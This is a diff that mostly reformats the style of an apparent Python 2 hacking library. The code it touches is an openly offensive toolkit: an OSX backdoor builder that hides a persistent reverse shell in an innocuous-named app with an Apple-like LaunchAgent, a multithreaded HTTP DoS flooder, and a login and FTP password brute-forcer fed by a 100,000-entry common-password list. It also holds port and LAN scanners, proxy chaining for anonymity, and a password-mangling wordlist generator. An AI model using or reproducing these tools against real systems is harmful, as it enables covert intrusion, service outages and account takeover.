@@ -18,14 +18,20 @@ HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTIO
 CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE
 OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.'''
 
-import socket, httplib, threading, time, urllib2, os
+import socket
+import threading
+import time
+import urllib2
+import os
 from Queue import Queue
-try: # Import scapy if they have it. If they don't, they can still use hacklib
+try:  # Import scapy if they have it. If they don't, they can still use hacklib
     from scapy.all import *
     import logging
-    logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Fixes scapy logging error
-except: pass
-from string import ascii_uppercase, ascii_lowercase, digits # Import for PatternCreate and PatternOffset
+    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Fixes scapy logging error
+except:
+    pass
+from string import ascii_uppercase, ascii_lowercase, digits  # Import for PatternCreate and PatternOffset
+
 
 class Backdoor(object):
     '''Creates an app carrying a persistent backdoor payload. Currently only for Mac OSX.
@@ -62,20 +68,22 @@ launchctl load ~/Library/LaunchAgents/com.apples.services.plist
 exit
 '''
 
-    def create(self, IP, port, OS, appname = 'funny_cats'):
+    def create(self, IP, port, OS, appname='funny_cats'):
         '''Creates a user-level reverse shell.'''
-        
+
         if OS == 'OSX':
             self.osx_payload = self.osx_payload.replace('HOST', IP).replace('PORT', str(port))
             try:
                 os.makedirs(os.getcwd() + '/' + appname + '.app/Contents/MacOS')
-            except: pass
+            except:
+                pass
             payload_path = os.getcwd() + '/' + appname + '.app/Contents/MacOS/' + appname
             with open(payload_path, 'w') as f:
                 f.write(self.osx_payload)
             import subprocess
             subprocess.Popen(['chmod', '755', payload_path])
             print 'Payload saved to ' + os.getcwd() + '/' + appname + '.app'
+
 
 class Server(object):
 
@@ -104,7 +112,8 @@ class Server(object):
                         time.sleep(0.5)
             finally:
                 connection.close()
-                
+
+
 class FTPAuth(object):
     '''FTP login and command handler.
     Commands:
@@ -143,7 +152,8 @@ class FTPAuth(object):
             return 'Password required'
         else:
             raise Exception(response)
-        
+
+
 class AuthClient(object):
     '''Universal login tool for most login pages as well as HTTP Basic Authentication.
     Commands:
@@ -165,7 +175,7 @@ class AuthClient(object):
                 return 'BA'
             if 'timed out' in str(e).lower():
                 return 'TO'
-            
+
     def _login_mechanize(self):
         try:
             import mechanize
@@ -186,17 +196,21 @@ class AuthClient(object):
         password_control = ''
         # Locates username and password input, and submits login info
         for control in br.form.controls:
-            if control.name and control.name.lower() in userfields or control.id and control.id.lower() in userfields: username_control = control
-            if control.name and control.name.lower() in passfields or control.id and control.id.lower() in passfields: password_control = control
+            if control.name and control.name.lower() in userfields or control.id and control.id.lower() in userfields:
+                username_control = control
+            if control.name and control.name.lower() in passfields or control.id and control.id.lower() in passfields:
+                password_control = control
         username_control.value = self.username
-        try: password_control.value = self.password
+        try:
+            password_control.value = self.password
         except:
             # Detected a username input but not a password input.
             # Submits form with username and attempts to detect password input in resulting page
             response = br.submit()
             br.form = list(br.forms())[0]
             for control in br.form.controls:
-                if control.name and control.name.lower() in passfields or control.id and control.id.lower() in passfields: password_control = control
+                if control.name and control.name.lower() in passfields or control.id and control.id.lower() in passfields:
+                    password_control = control
         password_control.value = self.password
         response = br.submit()
         # Returns response if the URL is changed. Assumes login failure if URL is the same
@@ -220,7 +234,7 @@ class AuthClient(object):
         except Exception, e:
             if 'Error 401' in str(e):
                 raise Exception('Login credentials incorrect.')
-            
+
     def login(self, url, username, password):
         self.url = url
         self.username = username
@@ -229,11 +243,12 @@ class AuthClient(object):
         logintype = self. _get_login_type()
         if logintype == 'BA':
             # attempts to login with BA method and return html
-           return self._login_BA()
+            return self._login_BA()
         if logintype == 'TO':
             raise Exception('Request timed out.')
         if logintype == 'FORM':
             return self._login_mechanize()
+
 
 class DOSer(object):
     '''Hits a host with GET requests on default port 80 from multiple threads.
@@ -250,16 +265,17 @@ class DOSer(object):
         self.start_time = 0
         self.time_length = 1
 
-    def _attack(self, target):  
+    def _attack(self, target):
         # Sends GET requests for time_length duration
         while int(time.time()) < self.start_time + self.time_length:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(1)
             try:
                 s.connect((self.target, self.port))
-                s.send("GET /" + self.payload + " HTTP/1.1\r\n")  
-                s.send("Host: " + self.target  + "\r\n\r\n")
-            except: pass
+                s.send("GET /" + self.payload + " HTTP/1.1\r\n")
+                s.send("Host: " + self.target + "\r\n\r\n")
+            except:
+                pass
 
     def _threader(self):
         while True:
@@ -267,7 +283,7 @@ class DOSer(object):
             self._attack(self.worker)
             self.q.task_done()
 
-    def launch(self, host, duration, threads = 1, port = 80, payload = 'default'):
+    def launch(self, host, duration, threads=1, port=80, payload='default'):
         '''Launches threaded GET requests for (duration) seconds.
         '''
         self.target = host
@@ -275,7 +291,8 @@ class DOSer(object):
         self.threads = threads
         self.start_time = int(time.time())
         self.time_length = duration
-        if payload != 'default': self.payload = payload
+        if payload != 'default':
+            self.payload = payload
         # Creates queue to hold each thread
         self.q = Queue.Queue()
         #print '> Launching ' + str(threads) + ' threads for ' + str(duration) + ' seconds.'
@@ -289,6 +306,7 @@ class DOSer(object):
 
         self.q.join()
         return
+
 
 class PortScanner(object):
     '''Scan an IP address using scan(host) with default port range 1-1024.
@@ -309,7 +327,7 @@ class PortScanner(object):
         s.settimeout(self.timeout)
         # Tries to establish a connection to port, and append to list of open ports
         try:
-            con = s.connect((self.IP,port))
+            con = s.connect((self.IP, port))
             response = s.recv(1024)
             self.openlist.append(port)
             if self.verbose:
@@ -338,21 +356,22 @@ Accept-Encoding: gzip, deflate''' + '\r\n\r\n'
                             print 'Port', str(port) + ':'
                             print response
                     s.close()
-                except: pass
-                
+                except:
+                    pass
+
     def portOpen(self, port):
         if port in self.openlist:
             return
         else:
             return False
-        
+
     def _threader(self):
         while True:
             self.worker = self.q.get()
             self._portscan(self.worker)
             self.q.task_done()
 
-    def scan(self, IP, port_range = (1, 1025), timeout = 1, verbose = True):
+    def scan(self, IP, port_range=(1, 1025), timeout=1, verbose=True):
         '''Scans ports of an IP address. Use getIP() to find IP address of host.
         '''
         self.openlist = []
@@ -370,6 +389,7 @@ Accept-Encoding: gzip, deflate''' + '\r\n\r\n'
             self.q.put(worker)
 
         self.q.join()
+
 
 class LanScanner(object):
     '''Scans local devices on your LAN network.
@@ -393,7 +413,8 @@ class LanScanner(object):
         try:
             resp = subprocess.check_output(['ping', '-c1', '-W90', host])
             self.alive_hosts.append(host)
-        except: return
+        except:
+            return
 
     def getLocalIP(self):
         import subprocess
@@ -403,8 +424,8 @@ class LanScanner(object):
         for line in data:
             if 'inet ' in line and '127.' not in line:
                 return line.split(' ')[1]
-        
-    def scan(self, h_range = (1, 255)):
+
+    def scan(self, h_range=(1, 255)):
         # Finds local IP first in order to determine IP range of local network
         localip = self.getLocalIP()
         stub = '.'.join(localip.split('.')[:-1])
@@ -421,10 +442,12 @@ class LanScanner(object):
             self.q.put(worker)
         self.q.join()
         return list(set(self.alive_hosts))
-    
+
+
 class _Getch:
     """Gets a single character from standard input.  Does not echo to the
     screen."""
+
     def __init__(self):
         try:
             self.impl = _GetchWindows()
@@ -439,10 +462,14 @@ class _Getch:
 
 class _GetchUnix:
     def __init__(self):
-        import tty, sys, termios
+        import tty
+        import sys
+        import termios
 
     def __call__(self):
-        import sys, tty, termios
+        import sys
+        import tty
+        import termios
         try:
             fd = sys.stdin.fileno()
             old_settings = termios.tcgetattr(fd)
@@ -452,7 +479,9 @@ class _GetchUnix:
             finally:
                 termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
             return ch
-        except: return raw_input('> ')
+        except:
+            return raw_input('> ')
+
 
 class _GetchWindows:
     def __init__(self):
@@ -462,7 +491,9 @@ class _GetchWindows:
         try:
             import msvcrt
             return msvcrt.getch()
-        except: return raw_input('> ')
+        except:
+            return raw_input('> ')
+
 
 class Proxy(object):
     '''Can work in conjunction with getProxies() to tunnel all
@@ -471,7 +502,7 @@ class Proxy(object):
                     connect() Args: getProxies(), timeout=10
                     connect_manual() Args: IP, port, proxy_type
     '''
-    
+
     def __init__(self):
         self.IP = ''
         self.port = ''
@@ -493,12 +524,13 @@ class Proxy(object):
                 socks.setdefaultproxy(self.proxy_type, proxy[0], int(proxy[1]))
                 socket.socket = socks.socksocket
                 # Tests to see if the proxy can open a webpage
-                currentIP = urllib2.urlopen('http://icanhazip.com/', timeout = timeout).read().split()[0]
+                currentIP = urllib2.urlopen('http://icanhazip.com/', timeout=timeout).read().split()[0]
                 self.IP = proxy[0]
                 self.port = int(proxy[1])
                 self.country = proxy[2]
                 return
-            except: pass
+            except:
+                pass
         raise Exception('Couldn\'t connect to any proxies.')
 
     def connect_manual(IP, port, proxy_type='Socks5'):
@@ -513,7 +545,8 @@ class Proxy(object):
             self.IP = IP
             self.port = port
             return currentIP
-        except: raise Exception('Connection failed.')
+        except:
+            raise Exception('Connection failed.')
 
 
 def importFromString(code, name):
@@ -521,29 +554,37 @@ def importFromString(code, name):
     Args: code: a string, a file handle, or a compiled binary
     name: the name of the module
     """
-    import sys, imp
+    import sys
+    import imp
     module = imp.new_module(name)
     exec code in module.__dict__
     return module
 
+
 def getIP(host):
     return socket.gethostbyname(host)
+
 
 def randomIP():
     import struct
     return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
 
-def getProxies(country_filter = 'ALL', proxy_type = ('Socks4', 'Socks5')):
+
+def getProxies(country_filter='ALL', proxy_type=('Socks4', 'Socks5')):
     '''Gets list of recently tested Socks4/5 proxies.
     Return format is as follows:
     [IP, Port, Country Code, Country, Proxy Type, Anonymous, Yes/No, Last Checked]
     Args: country_filter: Specify country codes within a tuple, e.g. ('US', 'MX')
     proxy_type: Specify whic Socks version to use, e.g. 'Socks5'
     '''
-    try: import mechanize
-    except: raise MissingPackageException('Please install the mechanize module before continuing. Use hacklib.installDependencies()')
-    try: from bs4 import BeautifulSoup
-    except: raise MissingPackageException('Please install the beautifulsoup4 module before continuing. Use hacklib.installDependencies()')
+    try:
+        import mechanize
+    except:
+        raise MissingPackageException('Please install the mechanize module before continuing. Use hacklib.installDependencies()')
+    try:
+        from bs4 import BeautifulSoup
+    except:
+        raise MissingPackageException('Please install the beautifulsoup4 module before continuing. Use hacklib.installDependencies()')
     br = mechanize.Browser()
     br.set_handle_robots(False)
     br.addheaders = [('User-agent', 'googlebot')]
@@ -570,23 +611,32 @@ def getProxies(country_filter = 'ALL', proxy_type = ('Socks4', 'Socks5')):
                 if proxy[4] in proxy_type and proxy[2] in country_filter:
                     filteredlist.append(proxy)
             else:
-                if proxy[4] in proxy_type: filteredlist.append(proxy)
+                if proxy[4] in proxy_type:
+                    filteredlist.append(proxy)
         proxylist = filteredlist
     return proxylist
+
 
 def installDependencies():
     import subprocess
     mech = subprocess.check_output(['/usr/local/bin/pip', 'install', 'mechanize'])
-    if 'successfully installed' in mech: print 'Installed mechanize'
+    if 'successfully installed' in mech:
+        print 'Installed mechanize'
     beaut = subprocess.check_output(['/usr/local/bin/pip', 'install', 'bs4'])
-    if 'successfully installed' in beaut: print 'Installed beautifulsoup'
+    if 'successfully installed' in beaut:
+        print 'Installed beautifulsoup'
     scapy = subprocess.check_output(['/usr/local/bin/pip', 'install', 'scapy'])
-    if 'successfully installed' in scapy: print 'Installed scapy'
+    if 'successfully installed' in scapy:
+        print 'Installed scapy'
     pcapy = subprocess.check_output(['/usr/local/bin/pip', 'install', 'pcapy'])
-    if 'successfully installed' in pcapy: print 'Installed pcapy'
+    if 'successfully installed' in pcapy:
+        print 'Installed pcapy'
+
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-def send(IP, port, message, keepalive = False):
+
+
+def send(IP, port, message, keepalive=False):
     '''Creates new socket and sends a TCP message. If keepalive is true, use hacklib.sock
     to handle socket and hacklib.sock.close() when finished.
     '''
@@ -596,17 +646,20 @@ def send(IP, port, message, keepalive = False):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((IP, port))
     sock.send(message)
-    response = sock.recv(2400000)
+    response = sock.recv(2048)
     if not keepalive:
         sock.close()
     return response
 
+
 def ping(host):
     """Pings a host and returns true if the host exists.
     """
-    import os, platform
-    ping_str = "-n 1" if  platform.system().lower()=="windows" else "-c 1"
+    import os
+    import platform
+    ping_str = "-n 1" if platform.system().lower() == "windows" else "-c 1"
     return os.system("ping " + ping_str + " " + host) == 0
+
 
 def topPasswords(amount):
     '''Get up to 100,000 most common passwords.
@@ -614,6 +667,7 @@ def topPasswords(amount):
     url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_100000.txt'
     passlist = urllib2.urlopen(url).read().split('\n')
     return passlist[:amount]
+
 
 def uiPortScan(address):
     print ''
@@ -631,6 +685,7 @@ def uiPortScan(address):
         ps.scan(address, (int(s_port), int(e_port)))
     print 'Port scan complete.'
 
+
 def uiDOS(address):
     dos = DOSer()
     print ''
@@ -641,11 +696,13 @@ def uiDOS(address):
     print 'Launching DOS attack'
     dos.launch(address, duration, threads, port, payload)
 
+
 def uiTCPMessage(address):
     print ''
     port = int(raw_input('Input port >'))
     message = raw_input('Message > ')
     send(address, port, message)
+
 
 def uiLogin(address):
     print ''
@@ -722,7 +779,7 @@ def uiLogin(address):
                 except:
                     print password + ' failed.'
                     ftp = FTPAuth(address)
-                    
+
         if cmd == '2':
             username = raw_input('Username > ')
             ftp.send('USER ' + username + '\r\n')
@@ -730,6 +787,7 @@ def uiLogin(address):
             ftp.send('PASS ' + password + '\r\n')
         if cmd == '3':
             return
+
 
 def uiLanScan():
     lan = LanScanner()
@@ -739,6 +797,7 @@ def uiLanScan():
         print ip
     print 'Lan scan complete.'
     time.sleep(2)
+
 
 def uiCreateBackdoor():
     print ''
@@ -754,13 +813,15 @@ def uiCreateBackdoor():
         bd.create(ip, port, 'OSX', appname)
         time.sleep(2)
 
+
 def uiServer():
     print ''
     port = raw_input('Listening port > ')
     s = Server(int(port))
     print 'Listening on port ' + port
     s.listen()
-    
+
+
 def userInterface():
     '''Start UI if hacklib isn't being used as a library.
     '''
@@ -796,10 +857,14 @@ def userInterface():
             print '4) Attempt login'
             print '5) Exit'
             cmd = ink()
-            if cmd == '1': uiPortScan(getIP(address))
-            if cmd == '2': uiDOS(getIP(address))
-            if cmd == '3': uiTCPMessage(getIP(address))
-            if cmd == '4': uiLogin(address)
+            if cmd == '1':
+                uiPortScan(getIP(address))
+            if cmd == '2':
+                uiDOS(getIP(address))
+            if cmd == '3':
+                uiTCPMessage(getIP(address))
+            if cmd == '4':
+                uiLogin(address)
             cmd = ''
 
         if cmd == '3':
@@ -810,7 +875,7 @@ def userInterface():
 
         if cmd == '5':
             uiServer()
-            
+
         if cmd == '1':
             print 'Would you like to automatically find a proxy or input one manually?'
             print 'Enter the number corresponding to your choice.'
@@ -832,11 +897,17 @@ def userInterface():
                 pr_address = raw_input('Proxy address > ')
                 pr_port = raw_input('Proxy port > ')
                 pr_type = raw_input('Enter "Socks4" or "Socks5" > ')
-                try: proxy.connect_manual(pr_address, pr_port, pr_type)
-                except: print 'Connection failed.'; time.sleep(2); pass
+                try:
+                    proxy.connect_manual(pr_address, pr_port, pr_type)
+                except:
+                    print 'Connection failed.'
+                    time.sleep(2)
+                    pass
                 print 'Proxy connected.'
                 time.sleep(2)
                 pass
+
+
 """
 
 This Class Mangles Words specified by the user
@@ -851,6 +922,7 @@ Output: T3st
 
 """
 
+
 class Mangle:
 
     def __init__(self, text, num1, num2, year1, year2):
@@ -861,13 +933,12 @@ class Mangle:
         self.year2 = year2
         self.text = text
 
-
     def Numbers(self):
 
         for x in self.text.split():
 
             for i in range(self.num1, self.num2):
-                
+
                 print ("%s" + "%s") % (x, i)
                 print ("%s" + "%s") % (i, x)
 
@@ -876,36 +947,32 @@ class Mangle:
         for x in self.text.split():
 
             for i in range(self.year1, self.year2):
-                
+
                 print ("%s" + "%s") % (x, i)
                 print ("%s" + "%s") % (i, x)
 
-
     def UniqueNum(self):
-        
+
         for x in self.text.split():
-              
+
             for i in range(self.num1, self.num2):
 
                 print ("%s" + "%s" + "%s") % (x, x, i)
 
-
     def UniqueYears(self):
 
         for x in self.text.split():
-              
+
             for i in range(self.year1, self.year2):
 
                 print ("%s" + "%s" + "%s") % (x, x, i)
-
-
 
     def FirstLetterCapNum(self):
 
         for x in self.text.split():
 
             for i in range(self.num1, self.num2):
-                
+
                 print ("%s" + "%s") % (x.capitalize(), i)
                 print ("%s" + "%s") % (i, x.capitalize())
 
@@ -915,38 +982,30 @@ class Mangle:
 
             print x.capitalize()
 
-
     def UniqueCaps(self):
 
         for x in self.text.split():
 
             print ("%s" + "s") % (x.capitalize(), x.capitalize())
-        
-
 
     def CapandYears(self):
 
         for x in self.text.split():
 
             for i in range(self.year1, self.year2):
-                
+
                 print ("%s" + "%s") % (x.capitalize(), i)
                 print ("%s" + "%s") % (i, x.capitalize())
-            
-        
+
     def Leet(self):
 
         for x in self.text.split():
             print x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8")
 
-
-
     def LeetCap(self):
 
         for x in self.text.split():
             print x.capitalize().replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8")
-
-
 
     def LeetYears(self):
 
@@ -957,7 +1016,6 @@ class Mangle:
                 print ("%s" + "%s") % (x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"), i)
                 print ("%s" + "%s") % (i, x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"))
 
-
     def LeetNumbers(self):
 
         for x in self.text.split():
@@ -967,14 +1025,11 @@ class Mangle:
                 print ("%s" + "%s") % (x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"), i)
                 print ("%s" + "%s") % (i, x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"))
 
-
     def UniqueLeet(self):
 
         for x in self.text.split():
 
-            print ("%s" + "%s") % (x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"),(x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8")))
-
-
+            print ("%s" + "%s") % (x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"), (x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8")))
 
     def Reverse(self):
 
@@ -982,13 +1037,10 @@ class Mangle:
 
             print x[::-1]
 
-
     def ReverseCap(self):
 
         for x in self.text.split():
             print x[::-1].capitalize()
-
-
 
     def ReverseNum(self):
 
@@ -999,8 +1051,6 @@ class Mangle:
                 print ("%s" + "%s") % (x[::-1], i)
                 print ("%s" + "%s") % (i, x[::-1])
 
-
-
     def ReverseYears(self):
 
         for x in self.text.split():
@@ -1010,23 +1060,24 @@ class Mangle:
                 print ("%s" + "%s") % (x[::-1], i)
                 print ("%s" + "%s") % (i, x[::-1])
 
-
     def ReverseUnique(self):
 
         for x in self.text.split():
 
             print x[::-1] + x[::-1]
 
+
 '''
 This Classes Dectects Probe Requests from Wireless Devices.
 
-Example: 
+Example:
 
 Probe = Proberequests("wlan0")
 
 Probe.startSniff()
 
 '''
+
 
 class Proberequests:
 
@@ -1053,9 +1104,10 @@ class Proberequests:
 
         sniff(iface=self.interface, prn=self.sniffProbe)
 
+
 """
 
-This class creates a unique pattern of 20280 characters. 
+This class creates a unique pattern of 20280 characters.
 
 This is a replica of the metasploit tool called pattern_create.rb
 
@@ -1069,9 +1121,10 @@ Creates a unique pattern of 1000 characters.
 
 """
 
+
 class PatternCreate:
 
-    global MAX_PATTERN_LENGTH 
+    global MAX_PATTERN_LENGTH
 
     MAX_PATTERN_LENGTH = 20280
 
@@ -1122,11 +1175,10 @@ Output: [+] Offset: 663
 
 """
 
+
 class PatternOffset:
 
     def __init__(self, search_pattern):
-        
-
 
         self.search_pattern = search_pattern
 
@@ -1158,11 +1210,14 @@ class PatternOffset:
 
         print "[+] Offset: " + str(offset)
 
+
 if __name__ == '__main__':
     userInterface()
 
+
 class MissingPackageException(Exception):
     '''Raise when 3rd party modules are not able to be imported.'''
+
 
 class MissingPipexception(Exception):
     '''Raise when pip is not able to be found'''
